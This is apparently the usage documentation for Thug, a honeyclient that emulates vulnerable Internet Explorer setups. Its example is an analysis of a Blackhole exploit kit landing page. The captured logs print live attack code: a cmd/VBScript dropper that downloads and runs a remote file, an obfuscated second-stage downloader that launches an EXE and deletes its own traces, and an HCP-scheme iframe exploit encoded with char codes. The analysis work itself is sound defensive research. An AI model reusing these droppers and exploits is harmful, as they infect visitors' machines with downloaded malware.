.. _usage:

Usage
==========================

.. toctree::
   :maxdepth: 2


Basic usage
-----------

Let's start our Thug tour by taking a look at the options it provides.

.. code-block:: sh

        ~/thug/src $ python thug.py -h

        Synopsis:
                Thug: Pure Python honeyclient implementation

        Usage:
                python thug.py [ options ] url

        Options:
                -h, --help              Display this help information
                -o, --output=           Log to a specified file
                -r, --referer=          Specify a referer
                -p, --proxy=            Specify a proxy (see below for format and supported schemes)
                -l, --local         
                -v, --verbose           Enable verbose mode    
                -d, --debug             Enable debug mode
                -a, --ast-debug         Enable AST debug mode (requires debug mode)
                -u, --useragent=        Select a user agent (see below for values, default: winxpie61)
                -A, --adobepdf=         Specify the Adobe Acrobat Reader version (default: 7.1.0) 

        Proxy Format:
                scheme://[username:password@]host:port (supported schemes: http, socks4, socks5)

        Available User-Agents:
                winxpie60                       Internet Explorer 6.0 (Windows XP)
                winxpie61                       Internet Explorer 6.1 (Windows XP)
                winxpie70                       Internet Explorer 7.0 (Windows XP)
                winxpie80                       Internet Explorer 8.0 (Windows XP)
                win2kie60                       Internet Explorer 6.0 (Windows 2000)
                win2kie80                       Internet Explorer 8.0 (Windows 2000)
                osx10safari5                    Safari 5.1.1 (MacOS X 10.7.2)


Let's start with a first basic real-world example: a Blackhole exploit kit.  

.. code-block:: sh
 :linenos:

        $ python thug.py "http://[omitted]/main.php?page=8c6c59becaa0da07"
        [2012-07-02 19:15:20] [HTTP] URL: http://[omitted]/main.php?page=8c6c59becaa0da07 (Status: 200, Referrer: None)
        [2012-07-02 19:15:20] <applet archive="Ryp.jar" code="sIda.sIda"><param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"></param></applet>
        [2012-07-02 19:15:20] [Navigator URL Translation] Ryp.jar -->  http://[omitted]/Ryp.jar
        [2012-07-02 19:15:22] [HTTP] URL: http://[omitted]/Ryp.jar (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:15:23] Saving applet Ryp.jar
        [2012-07-02 19:15:24] ActiveXObject: msxml2.xmlhttp
        [2012-07-02 19:15:24] ActiveXObject: acropdf.pdf
        [2012-07-02 19:15:24] Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
        [2012-07-02 19:15:24] Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
        [2012-07-02 19:15:24] Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
        [2012-07-02 19:15:24] Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
        [2012-07-02 19:15:24] Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
        [2012-07-02 19:15:24] ActiveXObject: shockwaveflash.shockwaveflash.10
        [2012-07-02 19:15:24] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (adodb.stream)
        [2012-07-02 19:15:24] ActiveXObject: adodb.stream
        [2012-07-02 19:15:24] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (Shell.Application)
        [2012-07-02 19:15:24] ActiveXObject: shell.application
        [2012-07-02 19:15:24] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (msxml2.XMLHTTP)
        [2012-07-02 19:15:24] ActiveXObject: msxml2.xmlhttp
        [2012-07-02 19:15:24] [Microsoft XMLHTTP ActiveX] Fetching from URL http://[omitted]/w.php?f=b081d&e=2
        [2012-07-02 19:15:27] [HTTP] URL: http://[omitted]/w.php?f=b081d&e=2 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:15:29] [Microsoft XMLHTTP ActiveX] Saving File: d328b5a123bce1c0d20d763ad745303a
        [2012-07-02 19:15:29] [Microsoft XMLHTTP ActiveX] send
        [2012-07-02 19:15:29] [Adodb.Stream ActiveX] open
        [2012-07-02 19:15:29] [Adodb.Stream ActiveX] Write
        [2012-07-02 19:15:29] [Adodb.Stream ActiveX] SaveToFile (.//..//a2ffcd1.exe)
        [2012-07-02 19:15:29] [Adodb.Stream ActiveX] Close
        [2012-07-02 19:15:29] [Shell.Application ActiveX] ShellExecute command: .//..//a2ffcd1.exe
        [2012-07-02 19:15:29] [Navigator URL Translation] ./data/ap1.php?f=b081d -->  http://[omitted]/data/ap1.php?f=b081d
        [2012-07-02 19:15:36] [HTTP] URL: http://[omitted]/data/ap1.php?f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:15:36] Microsoft Internet Explorer HCP Scheme Detected
        [2012-07-02 19:15:36] Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
        [2012-07-02 19:15:36] [AST]: Eval argument length > 64
        [2012-07-02 19:15:36] [Windows Script Host Run] Command: 
        cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B > %TEMP%\\l.vbs && %TEMP%\\l.vbs && taskkill /F /IM helpctr.exe

        [2012-07-02 19:15:36] [Windows Script Host Run - Stage 1] Code:
        cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B > %TEMP%\\l.vbs && %TEMP%\\l.vbs && taskkill /F /IM helpctr.exe
        [2012-07-02 19:15:36] [Windows Script Host Run - Stage 1] Downloading from URL http://[omitted]/data/hcp_vbs.php?f=b081d&d=0
        [2012-07-02 19:15:37] [HTTP] URL: http://[omitted]/data/hcp_vbs.php?f=b081d&d=0 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:15:37] [Windows Script Host Run - Stage 1] Saving file d26b9b1a1f667004945d1d000cf4f19e
        [2012-07-02 19:15:37] [Windows Script Host Run - Stage 2] Code:
        w=3000:x=200:y=1:z=false:a = "http://[omitted]/w.php?e=5&f=b081d":Set e = Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS")):Set f=e.GetSpecialFolder(2):b = f & "\exe.ex2":b=Replace(b,Month("2010-02-16"),"e"):OT = "GET":Set c = CreateObject(StrReverse("PTTHLMX.2LMXSM")):Set d = CreateObject(StrReverse("ertS.BDODA") & "am")  
        Set o=Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS"))
        On Error resume next
        c.open OT, a, z:c.send()  
        If c.Status = x Then  
        d.Open:d.Type = y:d.Write c.ResponseBody:d.SaveToFile b:d.Close  
        End If  
        Set w=CreateObject(StrReverse("llehS." & "tpi"&"rcSW"))
        Eval(Replace("W.ex2c b", Month("2010-02-16"), "E"))
        W.eXeC "taskkill /F /IM wm" & "player.e" & "xe":W.eXeC "taskkill /F /IM realplay.ex" & "e":Set g=o.GetFile(e.GetSpecialFolder(3-1) & "\" & StrReverse("bv.l") & "s"):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval("g.Delete")

        [2012-07-02 19:15:37] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&f=b081d
        [2012-07-02 19:15:43] [HTTP] URL: http://[omitted]/w.php?e=5&f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:15:45] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a
        [2012-07-02 19:15:45] <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" height="10" id="swf_id" width="10"><param name="movie" value="data/field.swf"></param><param name="allowScriptAccess" value="always"></param><param name="Play" value="0"></param><embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"></embed></object>
        [2012-07-02 19:15:45] <param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"></param>
        [2012-07-02 19:15:45] <param name="movie" value="data/field.swf"></param>
        [2012-07-02 19:15:45] [Navigator URL Translation] data/field.swf -->  http://[omitted]/data/field.swf
        [2012-07-02 19:15:52] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:15:52] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
        [2012-07-02 19:15:52] <param name="allowScriptAccess" value="always"></param>
        [2012-07-02 19:15:52] <param name="Play" value="0"></param>
        [2012-07-02 19:15:52] <embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"></embed>
        [2012-07-02 19:15:52] [Navigator URL Translation] data/field.swf -->  http://[omitted]/data/field.swf
        [2012-07-02 19:15:53] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:15:53] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
        [2012-07-02 19:15:53] Saving log analysis at ../logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511

Let's take a look at the directory which contains the logs for this session

.. code-block:: sh

        ~/thug/src $ cd ../logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511
        ~/thug/logs/baa880d8d79c3488f2c0557be24cca6b/20120702191511 $ ls -lhR
        .:
        total 232K
        -rw-r--r-- 1 buffer buffer 1008 Jul  2 19:15 502da89357ca5d7c85dc7a67f8977b21
        -rw-r--r-- 1 buffer buffer  81K Jul  2 19:15 analysis.xml
        drwxr-xr-x 6 buffer buffer  176 Jul  2 19:15 application
        -rwxr-xr-x 1 buffer buffer  89K Jul  2 19:15 d328b5a123bce1c0d20d763ad745303a
        -rw-r--r-- 1 buffer buffer  51K Jul  2 19:15 Ryp.jar
        drwxr-xr-x 3 buffer buffer   72 Jul  2 19:15 text

        ./application:
        total 0
        drwxr-xr-x 2 buffer buffer 96 Jul  2 19:15 java-archive
        drwxr-xr-x 2 buffer buffer 96 Jul  2 19:15 pdf
        drwxr-xr-x 2 buffer buffer 96 Jul  2 19:15 x-msdownload
        drwxr-xr-x 2 buffer buffer 96 Jul  2 19:15 x-shockwave-flash

        ./application/java-archive:
        total 52K
        -rw-r--r-- 1 buffer buffer 51K Jul  2 19:15 e3639fde6ddf7fd0182fff9757143ff2

        ./application/pdf:
        total 16K
        -rw-r--r-- 1 buffer buffer 15K Jul  2 19:15 3660fe0e4acd23ac13f3d043eebd2bbc

        ./application/x-msdownload:
        total 92K
        -rw-r--r-- 1 buffer buffer 89K Jul  2 19:15 d328b5a123bce1c0d20d763ad745303a

        ./application/x-shockwave-flash:
        total 4.0K
        -rw-r--r-- 1 buffer buffer 1008 Jul  2 19:15 502da89357ca5d7c85dc7a67f8977b21

        ./text:
        total 0
        drwxr-xr-x 2 buffer buffer 144 Jul  2 19:15 html

        ./text/html:
        total 72K
        -rw-r--r-- 1 buffer buffer 68K Jul  2 19:15 95ee609e6e3b69c2d9e68f34ff4a4335
        -rw-r--r-- 1 buffer buffer 878 Jul  2 19:15 d26b9b1a1f667004945d1d000cf4f19e
 

The file *analysis.xml* contains the URL analysis results saved in MAEC format (please refer to
http://maec.mitre.org for additional details). Please note that all the files downloaded during
the URL analysis are saved in this directory based on their Content-Type for convenience.

Moreover if MongoDB is installed the information you can see in this directory are saved in the 
database instance too. Let's take a deeper look using pymongo (you can get the same result by
using the MongoDB client *mongo*).

.. code-block:: sh

        buffer@alnitak ~ $ python
        Python 2.7.3 (default, Jun 12 2012, 10:22:50) 
        [GCC 4.5.3] on linux2
        Type "help", "copyright", "credits" or "license" for more information.
        >>> import pymongo
        >>> connection = pymongo.Connection()
        >>> db = connection.thug
        >>> url = db.urls.find_one({'url' : 'http://[omitted]/main.php?page=8c6c59becaa0da07'})
        >>> url
        {u'url': u'http://[omitted]/main.php?page=8c6c59becaa0da07', u'_id': ObjectId('4ff1b8efe732795951000000')}
        >>> for sample in db.samples.find({'url_id': url['_id']}):
        ...     print sample
        ... 
        
        {u'_id': ObjectId('4ff1b8f4e732795951000001'), u'url': u'http://[omitted]/Ryp.jar', u'type': u'JAR', u'sha1': u'5fffd5cc4a372a6c2a826a850a955cb6a4042272', u'url_id': ObjectId('4ff1b8efe732795951000000'), u'data': u'[skipped]', u'md5': u'e3639fde6ddf7fd0182fff9757143ff2'}
        {u'_id': ObjectId('4ff1b8f7e732795951000002'), u'url': u'http://[omitted]/w.php?f=b081d&e=2', u'type': u'PE', u'sha1': u'1445e7d338d0d7c20f1d2329f4d653cce1562cc8', u'url_id': ObjectId('4ff1b8efe732795951000000'), u'data':  u'[skipped]', u'md5': u'd328b5a123bce1c0d20d763ad745303a'}
        [..]
        >>> for event in db.events.find({'url_id': url['_id']}):
        ...     print event
        ... 
        {u'MAEC': u'<MAEC_Bundle xmlns:ns1="http://xml/metadataSharing.xsd" xmlns="http://maec.mitre.org/XMLSchema/maec-core-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maec.mitre.org/XMLSchema/maec-core-1 file:MAEC_v1.1.xsd" id="maec:thug:bnd:1" schema_version="1.100000">
        [..]        

Browser personality
-------------------

If no additional option (other than the URL) is provided the emulated browser personality is 
Internet Explorer 6.1 on Windows XP platform. This choice is usually quite interesting for
the really simple reason a lot of exploit kits out try to exploit a vulnerability in Microsoft 
Data Access Components (MDAC) which allows remote code execution if facing such personality.
Thug emulates perfectly this exploit thus allowing to quite easily download a malicious 
executable for later analysis. 

If there's the need to test the content that would be served if using a different browser 
personality the *-u (--useragent)* option should be used. In the following example, the
option *-u winxpie80* is used in order to test the content served when surfing the same 
page with Internet Explorer 8.0 on Windows XP platform.


.. code-block:: sh

        $ python thug.py -u winxpie80 "http://[omitted]/main.php?page=8c6c59becaa0da07"
        [2012-07-02 19:21:00] [HTTP] URL: http://[omitted]/main.php?page=8c6c59becaa0da07 (Status: 200, Referrer: None)
        [2012-07-02 19:21:00] <applet archive="Ryp.jar" code="sIda.sIda"><param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"></param></applet>
        [2012-07-02 19:21:00] [Navigator URL Translation] Ryp.jar -->  http://[omitted]/Ryp.jar
        [2012-07-02 19:21:02] [HTTP] URL: http://[omitted]/Ryp.jar (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:21:03] Saving applet Ryp.jar
        [2012-07-02 19:21:03] ActiveXObject: msxml2.xmlhttp
        [2012-07-02 19:21:03] ActiveXObject: acropdf.pdf
        [2012-07-02 19:21:03] Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
        [2012-07-02 19:21:03] Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
        [2012-07-02 19:21:03] Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
        [2012-07-02 19:21:03] Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
        [2012-07-02 19:21:03] Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
        [2012-07-02 19:21:03] ActiveXObject: shockwaveflash.shockwaveflash.10
        [2012-07-02 19:21:03] [Navigator URL Translation] ./data/ap1.php?f=b081d -->  http://[omitted]/data/ap1.php?f=b081d
        [2012-07-02 19:21:05] [HTTP] URL: http://[omitted]/data/ap1.php?f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:21:05] Microsoft Internet Explorer HCP Scheme Detected
        [2012-07-02 19:21:05] Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
        [2012-07-02 19:21:05] [AST]: Eval argument length > 64
        [2012-07-02 19:21:05] [Windows Script Host Run] Command: 
        cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B > %TEMP%\\l.vbs && %TEMP%\\l.vbs && taskkill /F /IM helpctr.exe

        [2012-07-02 19:21:05] [Windows Script Host Run - Stage 1] Code:
        cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B > %TEMP%\\l.vbs && %TEMP%\\l.vbs && taskkill /F /IM helpctr.exe
        [2012-07-02 19:21:05] [Windows Script Host Run - Stage 1] Downloading from URL http://[omitted]/data/hcp_vbs.php?f=b081d&d=0
        [2012-07-02 19:21:06] [HTTP] URL: http://[omitted]/data/hcp_vbs.php?f=b081d&d=0 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:21:06] [Windows Script Host Run - Stage 1] Saving file d26b9b1a1f667004945d1d000cf4f19e
        [2012-07-02 19:21:06] [Windows Script Host Run - Stage 2] Code:
        w=3000:x=200:y=1:z=false:a = "http://[omitted]/w.php?e=5&f=b081d":Set e = Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS")):Set f=e.GetSpecialFolder(2):b = f & "\exe.ex2":b=Replace(b,Month("2010-02-16"),"e"):OT = "GET":Set c = CreateObject(StrReverse("PTTHLMX.2LMXSM")):Set d = CreateObject(StrReverse("ertS.BDODA") & "am")  
        Set o=Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS"))
        On Error resume next
        c.open OT, a, z:c.send()  
        If c.Status = x Then  
        d.Open:d.Type = y:d.Write c.ResponseBody:d.SaveToFile b:d.Close  
        End If  
        Set w=CreateObject(StrReverse("llehS." & "tpi"&"rcSW"))
        Eval(Replace("W.ex2c b", Month("2010-02-16"), "E"))
        W.eXeC "taskkill /F /IM wm" & "player.e" & "xe":W.eXeC "taskkill /F /IM realplay.ex" & "e":Set g=o.GetFile(e.GetSpecialFolder(3-1) & "\" & StrReverse("bv.l") & "s"):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval("g.Delete")

        [2012-07-02 19:21:06] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&f=b081d
        [2012-07-02 19:21:09] [HTTP] URL: http://[omitted]/w.php?e=5&f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:21:11] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a
        [2012-07-02 19:21:11] <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" height="10" id="swf_id" width="10"><param name="movie" value="data/field.swf"></param><param name="allowScriptAccess" value="always"></param><param name="Play" value="0"></param><embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"></embed></object>
        [2012-07-02 19:21:11] <param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"></param>
        [2012-07-02 19:21:11] <iframe height="0" src="hcp://services/search?query=anything&amp;topic=hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr=&lt;script defer&gt;eval(Run(String.fromCharCode(99,109,100,32,47,99,32,101,99,104,111,32,66,61,34,108,46,118,98,115,34,58,87,105,116,104,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,77,83,88,77,76,50,46,88,77,76,72,84,84,80,34,41,58,46,111,112,101,110,32,34,71,69,84,34,44,34,104,116,116,112,58,47,47,103,104,97,110,97,114,112,111,119,101,114,46,110,101,116,47,100,97,116,97,47,104,99,112,95,118,98,115,46,112,104,112,63,102,61,98,48,56,49,100,38,100,61,48,34,44,102,97,108,115,101,58,46,115,101,110,100,40,41,58,83,101,116,32,65,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,58,83,101,116,32,68,61,65,46,67,114,101,97,116,101,84,101,120,116,70,105,108,101,40,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,41,58,68,46,87,114,105,116,101,76,105,110,101,32,46,114,101,115,112,111,110,115,101,84,101,120,116,58,69,110,100,32,87,105,116,104,58,68,46,67,108,111,115,101,58,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,46,82,117,110,32,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,32,62,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,116,97,115,107,107,105,108,108,32,47,70,32,47,73,77,32,104,101,108,112,99,116,114,46,101,120,101)));&lt;/script&gt;" width="0"></iframe>
        [2012-07-02 19:21:11] [iframe redirection] http://[omitted]/main.php?page=8c6c59becaa0da07 -> hcp://services/search?query=anything&topic=hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr=<script defer>eval(Run(String.fromCharCode(99,109,100,32,47,99,32,101,99,104,111,32,66,61,34,108,46,118,98,115,34,58,87,105,116,104,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,77,83,88,77,76,50,46,88,77,76,72,84,84,80,34,41,58,46,111,112,101,110,32,34,71,69,84,34,44,34,104,116,116,112,58,47,47,103,104,97,110,97,114,112,111,119,101,114,46,110,101,116,47,100,97,116,97,47,104,99,112,95,118,98,115,46,112,104,112,63,102,61,98,48,56,49,100,38,100,61,48,34,44,102,97,108,115,101,58,46,115,101,110,100,40,41,58,83,101,116,32,65,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,58,83,101,116,32,68,61,65,46,67,114,101,97,116,101,84,101,120,116,70,105,108,101,40,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,41,58,68,46,87,114,105,116,101,76,105,110,101,32,46,114,101,115,112,111,110,115,101,84,101,120,116,58,69,110,100,32,87,105,116,104,58,68,46,67,108,111,115,101,58,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,46,82,117,110,32,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,32,62,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,116,97,115,107,107,105,108,108,32,47,70,32,47,73,77,32,104,101,108,112,99,116,114,46,101,120,101)));</script>
        [2012-07-02 19:21:11] <param name="movie" value="data/field.swf"></param>
        [2012-07-02 19:21:11] [Navigator URL Translation] data/field.swf -->  http://[omitted]/data/field.swf
        [2012-07-02 19:21:17] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:21:17] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
        [2012-07-02 19:21:17] <param name="allowScriptAccess" value="always"></param>
        [2012-07-02 19:21:17] <param name="Play" value="0"></param>
        [2012-07-02 19:21:17] <embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"></embed>
        [2012-07-02 19:21:17] [Navigator URL Translation] data/field.swf -->  http://[omitted]/data/field.swf
        [2012-07-02 19:21:18] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:21:18] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
        [2012-07-02 19:21:18] Saving log analysis at ../logs/baa880d8d79c3488f2c0557be24cca6b/20120702192057


It's quite simple to realize that the exploit for the Microsoft Data Access Components (MDAC)
vulnerability is not served as previously staten. 


Adobe Acrobat Reader
--------------------

Taking a look at the available options you can see the -A (--adobepdf) option which is quite 
useful for getting different PDF exploits which target different version of Adobe Acrobat
Reader. This happens because exploit kits usually serve PDF files which exploit specific 
vulnerabilities basing on Adobe Acrobat Reader version. Let's take a look at what happens if
we try to analyze the same page with Adobe Acrobat Reader 8.1.0 instead of 7.1.0 which is
the default one. 

.. code-block:: sh

        $ python thug.py -A 8.1.0 "http://[omitted]/main.php?page=8c6c59becaa0da07"
        [2012-07-02 19:18:00] [HTTP] URL: http://[omitted]/main.php?page=8c6c59becaa0da07 (Status: 200, Referrer: None)
        [2012-07-02 19:18:00] <applet archive="Ryp.jar" code="sIda.sIda"><param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"></param></applet>
        [2012-07-02 19:18:00] [Navigator URL Translation] Ryp.jar -->  http://[omitted]/Ryp.jar
        [2012-07-02 19:18:03] [HTTP] URL: http://[omitted]/Ryp.jar (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:18:03] Saving applet Ryp.jar
        [2012-07-02 19:18:04] ActiveXObject: msxml2.xmlhttp
        [2012-07-02 19:18:04] ActiveXObject: acropdf.pdf
        [2012-07-02 19:18:04] Unknown ActiveX Object: shockwaveflash.shockwaveflash.15
        [2012-07-02 19:18:04] Unknown ActiveX Object: shockwaveflash.shockwaveflash.14
        [2012-07-02 19:18:04] Unknown ActiveX Object: shockwaveflash.shockwaveflash.13
        [2012-07-02 19:18:04] Unknown ActiveX Object: shockwaveflash.shockwaveflash.12
        [2012-07-02 19:18:04] Unknown ActiveX Object: shockwaveflash.shockwaveflash.11
        [2012-07-02 19:18:04] ActiveXObject: shockwaveflash.shockwaveflash.10
        [2012-07-02 19:18:04] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (adodb.stream)
        [2012-07-02 19:18:04] ActiveXObject: adodb.stream
        [2012-07-02 19:18:04] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (Shell.Application)
        [2012-07-02 19:18:04] ActiveXObject: shell.application
        [2012-07-02 19:18:04] [Microsoft MDAC RDS.Dataspace ActiveX] CreateObject (msxml2.XMLHTTP)
        [2012-07-02 19:18:04] ActiveXObject: msxml2.xmlhttp
        [2012-07-02 19:18:04] [Microsoft XMLHTTP ActiveX] Fetching from URL http://[omitted]/w.php?f=b081d&e=2
        [2012-07-02 19:18:07] [HTTP] URL: http://[omitted]/w.php?f=b081d&e=2 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:18:08] [Microsoft XMLHTTP ActiveX] Saving File: d328b5a123bce1c0d20d763ad745303a
        [2012-07-02 19:18:08] [Microsoft XMLHTTP ActiveX] send
        [2012-07-02 19:18:08] [Adodb.Stream ActiveX] open
        [2012-07-02 19:18:08] [Adodb.Stream ActiveX] Write
        [2012-07-02 19:18:08] [Adodb.Stream ActiveX] SaveToFile (.//..//3c9f737.exe)
        [2012-07-02 19:18:08] [Adodb.Stream ActiveX] Close
        [2012-07-02 19:18:08] [Shell.Application ActiveX] ShellExecute command: .//..//3c9f737.exe
        [2012-07-02 19:18:08] [Navigator URL Translation] ./data/ap2.php -->  http://[omitted]/data/ap2.php
        [2012-07-02 19:18:14] [HTTP] URL: http://[omitted]/data/ap2.php (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
        [2012-07-02 19:18:15] Microsoft Internet Explorer HCP Scheme Detected
        [2012-07-02 19:18:15] Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
